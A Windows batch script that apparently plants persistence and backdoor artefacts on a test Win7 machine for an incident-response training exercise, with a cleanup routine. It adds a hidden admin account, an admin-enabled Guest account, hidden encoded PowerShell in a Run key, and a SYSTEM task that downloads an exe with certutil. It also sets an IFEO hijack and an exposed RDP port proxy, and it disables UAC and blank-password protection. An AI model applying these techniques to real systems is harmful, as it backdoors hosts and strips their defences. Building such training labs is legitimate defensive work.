@echo off
setlocal EnableExtensions
rem JW2026-WIN7-01 plant. Objects use ctfir-marker prefix. Win7 cmd compatible.
rem Does not touch Administrator password, sshd, VMware, A7C9 leftovers, or sethc.exe.

set STATEDIR=C:\ctfir-test\jw2026-win7-01
set LOG=%STATEDIR%\install.log
set TEMPDIR=C:\Windows\Temp
if not exist "%STATEDIR%" mkdir "%STATEDIR%"
echo [%DATE% %TIME%] plant start > "%LOG%"

call :log backup_state
call :save_state

call :log pre_clean
call :cleanup_best_effort

call :log W1_user
net user ctfir-marker$ Jw2026!Marker /add /expires:never /passwordchg:no >> "%LOG%" 2>&1
net localgroup Administrators ctfir-marker$ /add >> "%LOG%" 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "ctfir-marker$" /t REG_DWORD /d 0 /f >> "%LOG%" 2>&1

call :log W2_guest
net user Guest /active:yes >> "%LOG%" 2>&1
net localgroup Administrators Guest /add >> "%LOG%" 2>&1

call :log W3_run
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v ctfir-marker /t REG_SZ /d "powershell.exe -nop -w hidden -enc SQBFAFgA" /f >> "%LOG%" 2>&1

call :log W4_task
echo @echo off> "%TEMPDIR%\ctfir-marker-sync.bat"
echo rem ctfir-marker persistence>> "%TEMPDIR%\ctfir-marker-sync.bat"
echo certutil -urlcache -split -f http://ctfir-marker.jtt.local/u.exe %TEMPDIR%\ctfir-marker-u.exe>> "%TEMPDIR%\ctfir-marker-sync.bat"
schtasks /create /tn ctfir-marker-sync /tr "%TEMPDIR%\ctfir-marker-sync.bat" /sc onstart /ru SYSTEM /f >> "%LOG%" 2>&1

call :log W5_service
copy /y "%SystemRoot%\System32\notepad.exe" "%TEMPDIR%\ctfir-marker-svc.exe" >nul
sc create ctfir-marker-WinUpdate binPath= "%TEMPDIR%\ctfir-marker-svc.exe" start= auto DisplayName= "ctfir-marker Windows Update Helper" >> "%LOG%" 2>&1

call :log W6_ifeo
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfir-marker-ifeo.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f >> "%LOG%" 2>&1

call :log W7_logonscript
echo @echo off> "%TEMPDIR%\ctfir-marker-logon.bat"
echo rem ctfir-marker logon>> "%TEMPDIR%\ctfir-marker-logon.bat"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v UserInitMprLogonScript /t REG_SZ /d "%TEMPDIR%\ctfir-marker-logon.bat" /f >> "%LOG%" 2>&1

call :log W8_hosts
findstr /c:"ctfir-marker.jtt.local" "%SystemRoot%\System32\drivers\etc\hosts" >nul
if errorlevel 1 echo 10.66.0.88 ctfir-marker.jtt.local>> "%SystemRoot%\System32\drivers\etc\hosts"

call :log W9_portproxy
netsh interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1 >> "%LOG%" 2>&1

call :log W10_files
copy /y "%SystemRoot%\System32\notepad.exe" "%TEMPDIR%\ctfir-marker-drop.exe" >nul
copy /y "%SystemRoot%\System32\notepad.exe" "%USERPROFILE%\Desktop\ctfir-marker-report.pdf.exe" >nul
echo lwgk-note> "%USERPROFILE%\Desktop\ctfir-marker-note.txt"
echo MZFAKE> "%USERPROFILE%\Desktop\ctfir-marker-note.txt:hidden.exe"
set STARTUP=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if not exist "%STARTUP%" mkdir "%STARTUP%"
echo CreateObject("Wscript.Shell").Run "cmd /c echo ctfir-marker",0 > "%STARTUP%\ctfir-marker.vbs"

call :log W11_share
if not exist "%TEMPDIR%\ctfir-marker-share" mkdir "%TEMPDIR%\ctfir-marker-share"
net share ctfir-marker="%TEMPDIR%\ctfir-marker-share" >> "%LOG%" 2>&1

call :log W12_uac
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >> "%LOG%" 2>&1

call :log W13_blankpwd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >> "%LOG%" 2>&1

call :log done
echo PLANTED JW2026-WIN7-01
echo log %LOG%
exit /b 0

:save_state
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA > "%STATEDIR%\EnableLUA.bak" 2>&1
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse > "%STATEDIR%\LimitBlankPasswordUse.bak" 2>&1
echo EnableLUA_orig=1> "%STATEDIR%\state.txt"
echo LimitBlankPasswordUse_orig=1>> "%STATEDIR%\state.txt"
echo Guest_was_active=no>> "%STATEDIR%\state.txt"
goto :eof

:cleanup_best_effort
net user ctfir-marker$ /delete >nul 2>&1
net localgroup Administrators Guest /delete >nul 2>&1
net user Guest /active:no >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "ctfir-marker$" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v ctfir-marker /f >nul 2>&1
schtasks /delete /tn ctfir-marker-sync /f >nul 2>&1
sc stop ctfir-marker-WinUpdate >nul 2>&1
sc delete ctfir-marker-WinUpdate >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfir-marker-ifeo.exe" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v UserInitMprLogonScript /f >nul 2>&1
netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0 >nul 2>&1
net share ctfir-marker /delete >nul 2>&1
netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0 >nul 2>&1
set HOSTS=%SystemRoot%\System32\drivers\etc\hosts
set HOSTSTMP=%TEMPDIR%\ctfir-marker-hosts.tmp
findstr /v /c:"ctfir-marker.jtt.local" "%HOSTS%" > "%HOSTSTMP%" 2>nul
findstr /c:"Microsoft" "%HOSTSTMP%" >nul 2>&1
if not errorlevel 1 copy /y "%HOSTSTMP%" "%HOSTS%" >nul
del /f /q "%HOSTSTMP%" >nul 2>&1
del /f /q "%TEMPDIR%\ctfir-marker-sync.bat" >nul 2>&1
del /f /q "%TEMPDIR%\ctfir-marker-svc.exe" >nul 2>&1
del /f /q "%TEMPDIR%\ctfir-marker-drop.exe" >nul 2>&1
del /f /q "%TEMPDIR%\ctfir-marker-logon.bat" >nul 2>&1
del /f /q "%TEMPDIR%\ctfir-marker-u.exe" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ctfir-marker-report.pdf.exe" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ctfir-marker-note.txt" >nul 2>&1
del /f /q "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ctfir-marker.vbs" >nul 2>&1
goto :eof

:log
echo [%DATE% %TIME%] %* >> "%LOG%"
echo %*
goto :eof
